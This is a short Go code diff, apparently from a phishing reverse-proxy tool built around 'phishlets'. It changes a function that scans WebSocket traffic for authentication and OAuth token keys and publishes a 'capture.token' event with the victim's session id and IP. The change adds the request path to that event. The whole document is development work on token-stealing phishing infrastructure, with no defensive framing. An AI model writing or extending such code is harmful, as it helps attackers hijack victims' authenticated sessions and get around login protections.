@@ -166,7 +166,7 @@ func (e *Engine) scanWS(data []byte, ph *core.Phishlet, r *http.Request, sid str
 	for _, t := range ph.AuthTokens {
 		for _, k := range t.Keys {
 			if hit(k) {
-				_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "via": "ws", "ip": ip})
+				_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "via": "ws", "ip": ip, "path": r.URL.Path})
 				return
 			}
 		}
@@ -174,7 +174,7 @@ func (e *Engine) scanWS(data []byte, ph *core.Phishlet, r *http.Request, sid str
 	for _, k := range oauthKeys {
 		key := strings.TrimSuffix(k, "=")
 		if hit(key) {
-			_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": "ws", "ip": ip})
+			_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": "ws", "ip": ip, "path": r.URL.Path})
 			return
 		}
 	}
